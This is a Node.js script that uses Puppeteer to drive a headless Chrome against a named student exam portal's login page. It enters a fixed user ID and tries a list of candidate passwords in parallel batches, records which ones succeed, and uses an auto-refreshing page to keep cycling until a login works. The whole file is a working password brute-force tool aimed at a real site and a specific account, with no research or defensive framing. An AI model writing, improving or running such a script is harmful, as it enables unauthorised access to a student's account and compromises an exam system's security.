const express = require('express');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer-core');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3001;
const CHROME_PATH = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
const dataFilePath = './data/numbers.txt'; // Path to your text file containing numbers
const correctNumbersPath = './data/correctNumber.txt'; // Path to save successful numbers
const CHUNK_SIZE = 7; // Number of entries to process in one go

app.use(bodyParser.urlencoded({ extended: false }));
app.set('view engine', '.hbs');

// Function to submit form and extract data using Puppeteer
async function submitFormAndExtractData(rollNumber) {
    const browser = await puppeteer.launch({ executablePath: CHROME_PATH, headless: true });
    const page = await browser.newPage();

    try {
        await page.goto('https://www.bvvjdpexam.in/public/authentication/student_login', { waitUntil: 'networkidle2', timeout: 65000 });

        // Fill out and submit the form
        await page.type('input[name="USER_ID"]', 'SMKP210149889');
        await page.type('input[name="PASSWORD"]', rollNumber);
        await Promise.all([
            page.click('button[type="submit"]'),
            page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 65000 })
        ]);

        // Check the URL or content for success or failure indication
        const currentURL = page.url();
        const loginSuccessful = !currentURL.includes('student_login');

        return { rollNumber, loginSuccessful };
    } catch (error) {
        console.error(`Error in Puppeteer operation for roll number ${rollNumber}: ${error.message}`);
        return { rollNumber, error: error.message };
    } finally {
        await browser.close();
    }
}

async function processChunk(chunk) {
    const results = await Promise.all(chunk.map(rollNumber => submitFormAndExtractData(rollNumber.trim())));

    // Separate successful and failed roll numbers
    const successfulRollNumbers = results
        .filter(result => result.loginSuccessful)
        .map(result => result.rollNumber);
    const failedRollNumbers = results
        .filter(result => !result.loginSuccessful)
        .map(result => result.rollNumber);

    // Write the successful roll numbers to the correctNumbersPath file
    fs.appendFileSync(correctNumbersPath, successfulRollNumbers.join('\n') + '\n', 'utf8');
    console.log("file saved for successful entry")
        // Return failed roll numbers for further processing
    return failedRollNumbers;
}

app.get('/', async(req, res) => {
    try {
        // Read a portion of the file containing roll numbers
        const fileContents = fs.readFileSync(dataFilePath, 'utf8');
        let rollNumbers = fileContents.split(/\r?\n/).filter(line => line.trim() !== ''); // Split and filter empty lines
        console.log("loop started")
        while (rollNumbers.length > 0) {
            // Take the first CHUNK_SIZE roll numbers
            const chunk = rollNumbers.slice(0, CHUNK_SIZE);
            rollNumbers = rollNumbers.slice(CHUNK_SIZE);

            // Process the chunk
            const failedRollNumbers = await processChunk(chunk);

            // Write the failed roll numbers back to the file
            fs.writeFileSync(dataFilePath, rollNumbers.concat(failedRollNumbers).join('\n'), 'utf8');
            console.log("file saved for failed entry")
                // Stop to allow manual intervention and avoid overloading the system
            console.log('Processed a chunk of numbers. Please check the results and restart the process if needed.');
            // res.send('Chunk processed. Please check the results and restart the process if needed.');
            res.send("<meta http-equiv='refresh' content='10'><body>check</body>")
            return; // Stop processing after this chunk
        }

    } catch (error) {
        console.error(`Error: ${error.message}`);
        res.status(500).send('Internal Server Error');
    }
});

app.listen(PORT, () => {
    console.log(`Running on ${PORT}`);
});